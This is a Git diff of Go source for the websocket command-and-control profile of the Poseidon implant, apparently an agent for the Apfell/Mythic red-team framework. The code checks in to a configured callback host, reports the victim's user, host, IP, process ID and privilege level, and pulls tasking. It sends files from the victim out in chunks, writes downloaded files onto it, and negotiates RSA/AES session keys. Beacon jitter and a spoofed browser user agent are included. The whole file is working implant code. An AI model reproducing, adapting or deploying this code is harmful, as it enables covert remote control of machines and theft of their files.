@@ -11,87 +11,63 @@ import (
 	"math"
 	"net/http"
 	"os"
+	"reflect"
 	"strings"
+	"sync"
 	"time"
 
 	"github.com/gorilla/websocket"
 	"github.com/xorrior/poseidon/pkg/utils/crypto"
+	"github.com/xorrior/poseidon/pkg/utils/functions"
 	"github.com/xorrior/poseidon/pkg/utils/structs"
 )
 
-var (
-	websocketEndpoint = "socket"
-)
+var mu sync.Mutex
+
+var Config = structs.Websocketconfig{
+	"encrypted_exchange_check",
+	"AESPSK",
+	"callback_host:callback_port/",
+	"USER_AGENT",
+	callback_interval,
+	"domain_front",
+	callback_jitter,
+	"ENDPOINT_REPLACE",
+}
 
 type C2Websockets struct {
 	HostHeader     string
 	BaseURL        string
-	BaseURLs       []string
 	Interval       int
-	Commands       []string
+	Jitter         int
 	ExchangingKeys bool
 	ApfellID       string
 	UserAgent      string
 	UUID           string
-	AesPSK         string
+	Key            string
 	RsaPrivateKey  *rsa.PrivateKey
 	Conn           *websocket.Conn
+	Endpoint       string
 }
 
 func newProfile() Profile {
 	return &C2Websockets{}
 }
 
-func (c C2Websockets) Header() string {
-	return c.HostHeader
-}
-
-func (c *C2Websockets) SetHeader(newHeader string) {
-	c.HostHeader = newHeader
-}
-
-func (c C2Websockets) URL() string {
-	if len(c.BaseURLs) == 0 {
-		return c.BaseURL
-	} else {
-		return c.getRandomBaseURL()
-	}
-}
-
-func (c *C2Websockets) getRandomBaseURL() string {
-	return c.BaseURLs[seededRand.Intn(len(c.BaseURLs))]
-}
-
-func (c *C2Websockets) SetURL(newURL string) {
-	c.BaseURL = newURL
-}
-
-func (c *C2Websockets) SetURLs(newURLs []string) {
-	c.BaseURLs = newURLs
+func (c C2Websockets) getSleepTime() int {
+	return c.Interval + int(math.Round((float64(c.Interval) * (seededRand.Float64() * float64(c.Jitter)) / float64(100.0))))
 }
 
 func (c C2Websockets) SleepInterval() int {
-	return c.Interval
+	return c.getSleepTime()
 }
 
 func (c *C2Websockets) SetSleepInterval(interval int) {
 	c.Interval = interval
 }
 
-func (c C2Websockets) C2Commands() []string {
-	return c.Commands
-}
-
-func (c *C2Websockets) SetC2Commands(commands []string) {
-	c.Commands = commands
-}
-
-func (c C2Websockets) XKeys() bool {
-	return c.ExchangingKeys
-}
-
-func (c *C2Websockets) SetXKeys(xkeys bool) {
-	c.ExchangingKeys = xkeys
+func (c *C2Websockets) SetSleepJitter(jitter int) {
+	c.Jitter = jitter
 }
 
 func (c C2Websockets) ApfID() string {
@@ -102,109 +78,326 @@ func (c *C2Websockets) SetApfellID(newApf string) {
 	c.ApfellID = newApf
 }
 
-func (c C2Websockets) UniqueID() string {
-	return c.UUID
+func (c C2Websockets) ProfileType() string {
+	t := reflect.TypeOf(c)
+	return t.Name()
 }
 
-func (c *C2Websockets) SetUniqueID(newID string) {
-	c.UUID = newID
-}
+func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) interface{} {
+	// Set the C2 Profile values
+	c.BaseURL = Config.BaseURL
+	c.Interval = Config.Sleep
+	c.Jitter = Config.Jitter
 
-func (c *C2Websockets) SetUserAgent(ua string) {
-	c.UserAgent = ua
-}
+	if strings.Contains(Config.KEYX, "T") {
+		c.ExchangingKeys = true
+	} else {
+		c.ExchangingKeys = false
+	}
 
-func (c C2Websockets) GetUserAgent() string {
-	return c.UserAgent
-}
+	if len(Config.Key) > 0 {
+		c.Key = Config.Key
+	} else {
+		c.Key = ""
+	}
 
-func (c C2Websockets) AesPreSharedKey() string {
-	return c.AesPSK
-}
+	if len(Config.HostHeader) > 0 {
+		c.HostHeader = Config.HostHeader
+	}
 
-func (c *C2Websockets) SetAesPreSharedKey(newKey string) {
-	c.AesPSK = newKey
-}
+	if len(Config.UserAgent) > 0 {
+		c.UserAgent = Config.UserAgent
+	} else {
+		c.UserAgent = "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419.3 (KHTML, like Gecko) Safari/419.3"
+	}
 
-func (c C2Websockets) RsaKey() *rsa.PrivateKey {
-	return c.RsaPrivateKey
-}
+	c.Endpoint = Config.Endpoint
 
-func (c *C2Websockets) SetRsaKey(newKey *rsa.PrivateKey) {
-	c.RsaPrivateKey = newKey
+	// Establish a connection to the websockets server
+	url := fmt.Sprintf("%s%s", c.BaseURL, Config.Endpoint)
+	header := make(http.Header)
+	header.Set("User-Agent", c.UserAgent)
+
+	connection, _, err := websocket.DefaultDialer.Dial(url, header)
+
+	if err != nil {
+		//log.Printf("Error connecting to server %s ", err.Error())
+		return structs.CheckInMessageResponse{Action: "checkin", Status: "failed"}
+	}
+
+	c.Conn = connection
+
+	//log.Println("Connected to server ")
+	var resp []byte
+
+	c.UUID = UUID
+	c.ApfellID = c.UUID
+	checkin := structs.CheckInMessage{}
+	checkin.Action = "checkin"
+	checkin.User = user
+	checkin.Host = host
+	checkin.IP = ip
+	checkin.Pid = pid
+	checkin.UUID = c.UUID
+	if functions.IsElevated() {
+		checkin.IntegrityLevel = 3
+	} else {
+		checkin.IntegrityLevel = 2
+	}
+	checkinMsg, _ := json.Marshal(checkin)
+
+	if c.ExchangingKeys {
+		_ = c.NegotiateKey()
+	}
+
+	resp = c.sendData("", checkinMsg)
+	response := structs.CheckInMessageResponse{}
+	err = json.Unmarshal(resp, &response)
+	if err != nil {
+		//log.Printf("Error unmarshaling response: %s", err.Error())
+		return structs.CheckInMessageResponse{Status: "failed"}
+	}
+
+	if len(response.ID) > 0 {
+		c.ApfellID = response.ID
+	}
+
+	return response
 }
 
 func (c *C2Websockets) GetTasking() interface{} {
-	rawTask := c.sendData(TaskMsg, ApfellIDType, c.ApfID(), "", []byte(""))
-	task := structs.Task{}
-	err := json.Unmarshal(rawTask, &task)
+	request := structs.TaskRequestMessage{}
+	request.Action = "get_tasking"
+	request.TaskingSize = -1
+
+	raw, err := json.Marshal(request)
+
+	if err != nil {
+		//log.Printf("Error unmarshalling: %s", err.Error())
+	}
+
+	rawTask := c.sendData("", raw)
+	task := structs.TaskRequestMessageResponse{}
+	err = json.Unmarshal(rawTask, &task)
 
 	if err != nil {
 		//log.Printf("Error unmarshalling task data: %s", err.Error())
+		return task
 	}
 
 	return task
 }
 
-func (c *C2Websockets) PostResponse(task structs.Task, output string) []byte {
-	taskResp := structs.TaskResponse{}
-	taskResp.Response = base64.StdEncoding.EncodeToString([]byte(output))
-	dataToSend, _ := json.Marshal(taskResp)
-	return c.sendData(ResponseMsg, TASKIDType, task.ID, "", dataToSend)
+func (c *C2Websockets) PostResponse(output []byte, skipChunking bool) []byte {
+	return c.sendData("", output)
 }
 
-func (c *C2Websockets) SendFile(task structs.Task, params string) {
-	fileReq := structs.FileRegisterRequest{}
-	fileReq.Task = task.ID
+func (c *C2Websockets) SendFile(task structs.Task, params string, ch chan []byte) {
+
 	path := task.Params
 	// Get the file size first and then the # of chunks required
 	file, err := os.Open(path)
 
 	if err != nil {
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error opening file: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
 		return
 	}
 
 	fi, err := file.Stat()
 	if err != nil {
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error getting file size: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
 		return
 	}
 
 	size := fi.Size()
 	raw := make([]byte, size)
-	file.Read(raw)
+	_, err = file.Read(raw)
+	if err != nil {
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error reading file: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
+		return
+	}
 
-	c.SendFileChunks(task, raw)
+	_ = file.Close()
+
+	c.SendFileChunks(task, raw, ch)
 }
 
-func (c *C2Websockets) GetFile(fileid string) []byte {
-	fileData := c.sendData(FileMsg, FileIDType, fileid, c.ApfID(), []byte(""))
+func (c *C2Websockets) GetFile(task structs.Task, fileDetails structs.FileUploadParams, ch chan []byte) {
 
-	return fileData
+	fileUploadMsg := structs.FileUploadChunkMessage{} //Create the file upload chunk message
+	fileUploadMsg.Action = "upload"
+	fileUploadMsg.FileID = fileDetails.FileID
+	fileUploadMsg.ChunkSize = 1024000
+	fileUploadMsg.ChunkNum = 1
+	fileUploadMsg.FullPath = fileDetails.RemotePath
+	fileUploadMsg.TaskID = task.TaskID
+
+	msg, _ := json.Marshal(fileUploadMsg)
+	mu.Lock()
+	UploadResponses = append(UploadResponses, msg)
+	mu.Unlock()
+	// Wait for response from apfell
+	rawData := <-ch
+
+	fileUploadMsgResponse := structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
+	err := json.Unmarshal(rawData, &fileUploadMsgResponse)
+	if err != nil {
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
+		return
+	}
+
+	f, err := os.Create(fileDetails.RemotePath)
+	if err != nil {
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error creating file: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
+		return
+	}
+	defer f.Close()
+	decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
+
+	_, err = f.Write(decoded)
+
+	if err != nil {
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error writing to file: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
+		return
+	}
+
+	offset := int64(len(decoded))
+	if fileUploadMsgResponse.TotalChunks > 1 {
+		for index := 2; index <= fileUploadMsgResponse.TotalChunks; index++ {
+			fileUploadMsg = structs.FileUploadChunkMessage{}
+			fileUploadMsg.Action = "upload"
+			fileUploadMsg.ChunkNum = index
+			fileUploadMsg.ChunkSize = 1024000
+			fileUploadMsg.FileID = fileDetails.FileID
+			fileUploadMsg.FullPath = fileDetails.RemotePath
+			fileUploadMsg.TaskID = task.TaskID
+
+			msg, _ := json.Marshal(fileUploadMsg)
+			mu.Lock()
+			UploadResponses = append(UploadResponses, msg)
+			mu.Unlock()
+			rawData := <-ch
+
+			fileUploadMsgResponse = structs.FileUploadChunkMessageResponse{} // Unmarshal the file upload response from apfell
+			err := json.Unmarshal(rawData, &fileUploadMsgResponse)
+			if err != nil {
+				errResponse := structs.Response{}
+				errResponse.Completed = true
+				errResponse.TaskID = task.TaskID
+				errResponse.UserOutput = fmt.Sprintf("Error marshaling response: %s", err.Error())
+				errResponseEnc, _ := json.Marshal(errResponse)
+				mu.Lock()
+				TaskResponses = append(TaskResponses, errResponseEnc)
+				mu.Unlock()
+				return
+			}
+
+			decoded, _ := base64.StdEncoding.DecodeString(fileUploadMsgResponse.ChunkData)
+
+			_, err = f.WriteAt(decoded, offset)
+
+			if err != nil {
+				errResponse := structs.Response{}
+				errResponse.Completed = true
+				errResponse.TaskID = task.TaskID
+				errResponse.UserOutput = fmt.Sprintf("Error writing to file: %s", err.Error())
+				errResponseEnc, _ := json.Marshal(errResponse)
+				mu.Lock()
+				TaskResponses = append(TaskResponses, errResponseEnc)
+				mu.Unlock()
+				return
+			}
+
+			offset = offset + int64(len(decoded))
+		}
+	}
+
+	resp := structs.Response{}
+	resp.UserOutput = "File upload complete"
+	resp.Completed = true
+	resp.TaskID = task.TaskID
+	encResp, err := json.Marshal(resp)
+	mu.Lock()
+	TaskResponses = append(TaskResponses, encResp)
+	mu.Unlock()
+	return
 }
 
-func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte) {
+func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte, ch chan []byte) {
 	size := len(fileData)
 
 	const fileChunk = 512000 //Normal apfell chunk size
 	chunks := uint64(math.Ceil(float64(size) / fileChunk))
-
-	chunkResponse := structs.FileRegisterRequest{}
-	chunkResponse.Chunks = int(chunks)
-	chunkResponse.Task = task.ID
-
+	chunkResponse := structs.FileDownloadInitialMessage{}
+	chunkResponse.NumChunks = int(chunks)
+	chunkResponse.TaskID = task.TaskID
+	chunkResponse.FullPath = task.Params
 	msg, _ := json.Marshal(chunkResponse)
-	resp := c.PostResponse(task, string(msg))
-	fileResp := structs.FileRegisterResponse{}
+	mu.Lock()
+	TaskResponses = append(TaskResponses, msg)
+	mu.Unlock()
+	// Wait for a response from the channel
+	resp := <-ch
+	var fileDetails map[string]interface{}
 
-	err := json.Unmarshal(resp, &fileResp)
-
+	err := json.Unmarshal(resp, &fileDetails)
 	if err != nil {
+		errResponse := structs.Response{}
+		errResponse.Completed = true
+		errResponse.TaskID = task.TaskID
+		errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
+		errResponseEnc, _ := json.Marshal(errResponse)
+
+		mu.Lock()
+		TaskResponses = append(TaskResponses, errResponseEnc)
+		mu.Unlock()
 		return
 	}
-
 	r := bytes.NewBuffer(fileData)
 	// Sleep here so we don't spam apfell
-	time.Sleep(time.Duration(c.Interval) * time.Second)
+	//time.Sleep(time.Duration(c.getSleepTime()) * time.Second);
 	for i := uint64(0); i < chunks; i++ {
 		partSize := int(math.Min(fileChunk, float64(int64(size)-int64(i*fileChunk))))
 		partBuffer := make([]byte, partSize)
@@ -214,162 +407,169 @@ func (c *C2Websockets) SendFileChunks(task structs.Task, fileData []byte) {
 			break
 		}
 
-		msg := structs.FileChunk{}
+		msg := structs.FileDownloadChunkMessage{}
+		msg.ChunkNum = int(i) + 1
+		msg.FileID = fileDetails["file_id"].(string)
 		msg.ChunkData = base64.StdEncoding.EncodeToString(partBuffer)
-		msg.ChunkNumber = int(i) + 1
-		msg.FileID = fileResp.FileID
+		msg.TaskID = task.TaskID
 
 		encmsg, _ := json.Marshal(msg)
+		mu.Lock()
+		TaskResponses = append(TaskResponses, encmsg)
+		mu.Unlock()
 
-		resp := c.PostResponse(task, string(encmsg))
-		postResp := structs.FileChunkResponse{}
-		_ = json.Unmarshal(resp, &postResp)
+		// Wait for a response for our file chunk
+		decResp := <-ch
 
-		if !strings.Contains(postResp.Status, "success") {
+		var postResp map[string]interface{}
+		err = json.Unmarshal(decResp, &postResp)
+		if err != nil {
+			errResponse := structs.Response{}
+			errResponse.Completed = true
+			errResponse.TaskID = task.TaskID
+			errResponse.UserOutput = fmt.Sprintf("Error unmarshaling task response: %s", err.Error())
+			errResponseEnc, _ := json.Marshal(errResponse)
+			mu.Lock()
+			TaskResponses = append(TaskResponses, errResponseEnc)
+			mu.Unlock()
+			return
+		}
+
+		if !strings.Contains(postResp["status"].(string), "success") {
 			// If the post was not successful, wait and try to send it one more time
-			time.Sleep(time.Duration(c.Interval) * time.Second)
-			resp = c.PostResponse(task, string(encmsg))
+
+			mu.Lock()
+			TaskResponses = append(TaskResponses, encmsg)
+			mu.Unlock()
 		}
 
-		time.Sleep(time.Duration(c.Interval) * time.Second)
+		time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
 	}
+	// Reset the buffer to be empty
+	r.Reset()
+	r = nil
+	fileData = nil
 
-	c.PostResponse(task, "File download complete")
-}
-
-func (c *C2Websockets) CheckIn(ip string, pid int, user string, host string) interface{} {
-
-	// Establish a connection to the websockets server
-	url := fmt.Sprintf("%s%s", c.URL(), websocketEndpoint)
-	header := make(http.Header)
-	header.Set("User-Agent", UserAgent)
-
-	if len(c.Header()) != 0 {
-		header.Set("Host", c.Header())
-	}
-
-	connection, _, err := websocket.DefaultDialer.Dial(url, header)
-
-	if err != nil {
-		//log.Printf("Error connecting to server %s ", err.Error())
-		return structs.CheckinResponse{Status: "failed"}
-	}
-
-	c.Conn = connection
-
-	//log.Println("Connected to server ")
-	var resp []byte
-
-	checkin := structs.CheckInStruct{}
-	checkin.User = user
-	checkin.Host = host
-	checkin.IP = ip
-	checkin.Pid = pid
-	checkin.UUID = c.UUID
-
-	checkinMsg, _ := json.Marshal(checkin)
-
-	if c.ExchangingKeys {
-		sID := c.NegotiateKey()
-
-		if len(sID) == 0 {
-			//log.Println("Empty session id. Key exchange failed")
-			return structs.CheckinResponse{Status: "failed"}
-		}
-
-		//log.Println("Exchanging keys: ", c.XKeys())
-		resp = c.sendData(EKE, SESSIDType, sID, "", checkinMsg)
-	} else if len(c.AesPreSharedKey()) != 0 {
-		//log.Println("Sending AES PSK checkin")
-		resp = c.sendData(AES, UUIDType, c.UUID, "", checkinMsg)
-	} else {
-		//log.Println("Sending unencrypted checkin")
-		resp = c.sendData(CheckInMsg, UUIDType, c.UUID, "", checkinMsg)
-	}
-
-	//log.Printf("Raw response: %s ", string(resp))
-	respMsg := structs.CheckinResponse{}
-	err = json.Unmarshal(resp, &respMsg)
-	if err != nil {
-		//log.Printf("Error unmarshaling response: %s", err.Error())
-		return structs.CheckinResponse{Status: "failed"}
-	}
-
-	return respMsg
+	final := structs.Response{}
+	final.Completed = true
+	final.TaskID = task.TaskID
+	final.UserOutput = "file downloaded"
+	finalEnc, _ := json.Marshal(final)
+	//c.PostResponse(task, string(finalEnc))
+	mu.Lock()
+	TaskResponses = append(TaskResponses, finalEnc)
+	mu.Unlock()
 }
 
 func (c *C2Websockets) NegotiateKey() string {
 	sessionID := GenerateSessionID()
 	pub, priv := crypto.GenerateRSAKeyPair()
-	c.SetRsaKey(priv)
-	initMessage := structs.EKEInit{}
-	// Assign the session ID and the base64 encoded pub key
+	c.RsaPrivateKey = priv
+	//initMessage := structs.EKEInit{}
+	initMessage := structs.EkeKeyExchangeMessage{}
+	initMessage.Action = "staging_rsa"
 	initMessage.SessionID = sessionID
-	initMessage.Pub = base64.StdEncoding.EncodeToString(pub)
+	initMessage.PubKey = base64.StdEncoding.EncodeToString(pub)
 
 	// Encode and encrypt the json message
-	unencryptedMsg, err := json.Marshal(initMessage)
+	raw, err := json.Marshal(initMessage)
 
 	if err != nil {
-		//log.Printf("Error marshaling data %s", err.Error())
+		//log.Printf("Error marshaling data: %s", err.Error())
 		return ""
 	}
 
-	res := c.sendData(EKE, UUIDType, UUID, "", unencryptedMsg)
-	// base64 decode the response and then decrypt it
-	rawResp, err := base64.StdEncoding.DecodeString(string(res))
-	if err != nil {
-		//log.Printf("Error decoding string %s ", err.Error())
-		return ""
-	}
-	decryptedResponse := crypto.RsaDecryptCipherBytes(rawResp, c.RsaKey())
-	sessionKeyResp := structs.SessionKeyResponse{}
+	//log.Printf("Sending EKE msg: %+v\n", initMessage)
+	resp := c.sendData("", raw)
 
-	err = json.Unmarshal(decryptedResponse, &sessionKeyResp)
+	//decryptedResponse := crypto.RsaDecryptCipherBytes(resp, c.RsaPrivateKey)
+	sessionKeyResp := structs.EkeKeyExchangeMessageResponse{}
+
+	err = json.Unmarshal(resp, &sessionKeyResp)
 	if err != nil {
-		//log.Printf("Error unmarshaling response %s", err.Error())
+		//log.Printf("Error unmarshaling RsaResponse %s", err.Error())
 		return ""
 	}
 
+	//log.Printf("Received EKE response: %+v\n", sessionKeyResp)
 	// Save the new AES session key
-	c.SetAesPreSharedKey(sessionKeyResp.EncSessionKey)
-	c.SetXKeys(false)
+	encryptedSesionKey, _ := base64.StdEncoding.DecodeString(sessionKeyResp.SessionKey)
+	decryptedKey := crypto.RsaDecryptCipherBytes(encryptedSesionKey, c.RsaPrivateKey)
+	c.Key = base64.StdEncoding.EncodeToString(decryptedKey) // Save the new AES session key
+	c.ExchangingKeys = false
+
+	if len(sessionKeyResp.UUID) > 0 {
+		c.ApfellID = sessionKeyResp.UUID
+	}
+
 	return sessionID
 
 }
 
-func (c *C2Websockets) sendData(msgType int, idType int, id string, tag string, data []byte) []byte {
+func (c *C2Websockets) sendData(tag string, sendData []byte) []byte {
 	m := structs.Message{}
 
-	if len(c.AesPreSharedKey()) != 0 {
-		m.Data = string(EncryptMessage(data, c.AesPreSharedKey()))
-	} else {
-		m.Data = string(data)
+	for true {
+		if len(c.Key) != 0 {
+			sendData = c.encryptMessage(sendData)
+		}
+
+		sendData = append([]byte(c.ApfellID), sendData...)
+		sendData = []byte(base64.StdEncoding.EncodeToString(sendData))
+
+		m.Client = true
+		m.Data = string(sendData)
+		m.Tag = tag
+		//log.Printf("Sending message %+v\n", m)
+		err := c.Conn.WriteJSON(m)
+		if err != nil {
+			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
+			continue
+		}
+		// Read the response
+		resp := structs.Message{}
+		err = c.Conn.ReadJSON(&resp)
+
+		if err != nil {
+			//log.Println("Error trying to read message ", err.Error())
+			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
+			continue
+		}
+
+		raw, err := base64.StdEncoding.DecodeString(resp.Data)
+		if err != nil {
+			//log.Println("Error decoding base64 data: ", err.Error())
+			return make([]byte, 0)
+		}
+
+		if len(raw) == 0 {
+			time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
+			continue
+		}
+
+		enc_raw := raw[36:] // Remove the Payload UUID
+
+		if len(c.Key) != 0 {
+			//log.Printf("Decrypting data")
+			enc_raw = c.decryptMessage(enc_raw)
+			if len(enc_raw) == 0 {
+				time.Sleep(time.Duration(c.getSleepTime()) * time.Second)
+				continue
+			}
+		}
+
+		return enc_raw
 	}
 
-	m.MType = msgType
-	m.IDType = idType
-	m.ID = id
-	m.Tag = tag
-	m.Client = true
-	//log.Printf("Sending message %+v\n", m)
-	err := c.Conn.WriteJSON(m)
+	return make([]byte, 0)
+}
 
-	// Read the response
-	respMsg := structs.Message{}
-	err = c.Conn.ReadJSON(&respMsg)
+func (c *C2Websockets) encryptMessage(msg []byte) []byte {
+	key, _ := base64.StdEncoding.DecodeString(c.Key)
+	return crypto.AesEncrypt(key, msg)
+}
 
-	if err != nil {
-		//log.Println("Error trying to read message ", err.Error())
-		return make([]byte, 0)
-	}
-
-	//log.Printf("Received message %+v\n", respMsg)
-	// If the AES key is set, exchanging keys is true, and the message is encrypted
-	if len(c.AesPreSharedKey()) != 0 && c.ExchangingKeys != true {
-		return DecryptMessage([]byte(respMsg.Data), c.AesPreSharedKey())
-	}
-
-	return []byte(respMsg.Data)
-
+func (c *C2Websockets) decryptMessage(msg []byte) []byte {
+	key, _ := base64.StdEncoding.DecodeString(c.Key)
+	return crypto.AesDecrypt(key, msg)
 }
